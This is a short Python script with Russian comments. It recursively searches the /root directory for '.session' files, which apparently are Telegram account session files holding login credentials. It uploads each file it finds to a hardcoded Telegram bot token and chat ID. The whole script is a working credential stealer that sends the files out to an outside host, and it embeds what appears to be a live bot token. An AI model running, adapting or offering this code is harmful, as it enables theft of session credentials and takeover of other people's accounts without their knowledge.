import os
import requests
from pathlib import Path

# Токен и ID чата Telegram
TELEGRAM_BOT_TOKEN = '7921723856:AAGuefrWyoqnpY5riZd-dKhfOn2IOICXxdc'
CHAT_ID = '52133050'

def find_files(extension, search_path):
    """Ищет файлы с заданным расширением в указанной директории и всех её подпапках."""
    result = []
    search_path = Path(search_path)

    # Используем rglob для рекурсивного поиска в подпапках
    for file_path in search_path.rglob(f'*{extension}'):
        try:
            if file_path.is_file():  # Убедимся, что это файл
                result.append(file_path)
        except OSError as e:
            print(f'Ошибка доступа к {file_path}: {e}')  # Игнорируем ошибку
    return result

def send_file_to_telegram(file_path):
    """Отправляет файл в Telegram."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': CHAT_ID}
        response = requests.post(url, files=files, data=data)
        if response.ok:
            print(f'Файл {file_path} успешно отправлен в Telegram.')
        else:
            print(f'Ошибка при отправке файла {file_path}: {response.text}')

# Начинаем поиск с директории /root
search_path = Path('/root')
extension = '.session'
found_files = find_files(extension, search_path)

# Отправляем найденные файлы в Telegram
if found_files:
    for file_path in found_files:
        send_file_to_telegram(file_path)
else:
    print("Файлы не найдены.")
